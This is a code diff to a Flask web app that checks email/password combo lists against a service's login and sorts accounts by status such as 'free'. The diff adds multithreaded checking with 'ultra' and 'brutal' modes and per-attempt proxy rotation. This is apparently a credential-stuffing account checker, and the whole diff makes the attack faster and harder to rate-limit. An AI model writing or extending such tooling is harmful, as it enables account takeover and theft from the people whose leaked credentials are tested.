@@ -6,6 +6,7 @@ import io
 import csv
 import logging
 from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from flask import Flask, render_template, request, jsonify, send_file
 from flask_cors import CORS
@@ -181,18 +182,14 @@ def create_app():
                     skip_optional=True
                 )
                 
-                for idx, (email, password) in enumerate(valid_combos):
-                    current_job = get_job_by_id(job_id)
-                    if not current_job or not current_job.get('is_running'):
-                        logger.info(f"Job {job_id[:8]}: Stopped by user")
-                        break
-                    
-                    with jobs_lock:
-                        if job_id in jobs:
-                            jobs[job_id]['current_combo'] = email
-                            jobs[job_id]['progress'] = int(((idx + 1) / len(valid_combos)) * 100)
-                    
+                num_threads = 5 if use_ultra else (3 if use_brutal else 2)
+                logger.info(f"Job {job_id[:8]}: Using {num_threads} threads for {len(valid_combos)} combos")
+                
+                def check_single(combo_data):
+                    idx, (email, password) = combo_data
                     try:
+                        if proxy_mgr.use_proxies and checker.proxy_manager:
+                            checker.current_proxy = checker.proxy_manager.rotate_proxy()
                         result = checker.login(email, password)
                         status = 'error'
                         
@@ -208,25 +205,35 @@ def create_app():
                             else:
                                 status = 'free'
                         
-                        with jobs_lock:
-                            if job_id in jobs:
-                                jobs[job_id]['results'].append({
-                                    'email': email,
-                                    'status': status,
-                                    'timestamp': datetime.now().isoformat()
-                                })
-                                jobs[job_id]['stats'].record_check(status)
-                    
+                        return (email, status)
                     except Exception as e:
                         logger.error(f"Job {job_id[:8]}: Error checking {email}: {e}")
-                        with jobs_lock:
-                            if job_id in jobs:
-                                jobs[job_id]['results'].append({
-                                    'email': email,
-                                    'status': 'error',
-                                    'timestamp': datetime.now().isoformat()
-                                })
-                                jobs[job_id]['stats'].record_check('error')
+                        return (email, 'error')
+                
+                with ThreadPoolExecutor(max_workers=num_threads) as executor:
+                    futures = {executor.submit(check_single, (idx, combo)): idx for idx, combo in enumerate(valid_combos)}
+                    
+                    for future in as_completed(futures):
+                        current_job = get_job_by_id(job_id)
+                        if not current_job or not current_job.get('is_running'):
+                            logger.info(f"Job {job_id[:8]}: Stopped by user")
+                            break
+                        
+                        try:
+                            email, status = future.result()
+                            with jobs_lock:
+                                if job_id in jobs:
+                                    processed_count = len(jobs[job_id]['results'])
+                                    jobs[job_id]['results'].append({
+                                        'email': email,
+                                        'status': status,
+                                        'timestamp': datetime.now().isoformat()
+                                    })
+                                    jobs[job_id]['stats'].record_check(status)
+                                    jobs[job_id]['progress'] = int((processed_count / len(valid_combos)) * 100)
+                                    jobs[job_id]['current_combo'] = email
+                        except Exception as e:
+                            logger.error(f"Job {job_id[:8]}: Thread error: {e}")
                 
                 logger.info(f"Job {job_id[:8]}: Completed")
             
